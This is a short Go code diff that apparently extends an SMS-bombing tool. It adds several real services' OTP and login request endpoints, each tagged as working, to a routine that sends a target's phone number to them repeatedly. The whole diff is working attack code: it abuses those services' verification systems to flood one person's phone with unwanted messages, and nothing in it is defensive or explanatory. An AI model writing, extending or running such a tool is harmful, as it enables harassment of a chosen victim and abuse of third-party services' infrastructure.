@@ -189,7 +189,19 @@ func main() {
 		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // active ✅
-
+		go sms("https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
+			"PhoneNo": phone,
+		}, ch)  // active ✅
+		go sms("https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // active ✅
+		s5 := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
+		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
+			s5: phone,
+		}, ch)  // active ✅
+		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)  // active ✅
 
 
 	for i := 0; i < repeatCount; i++ {
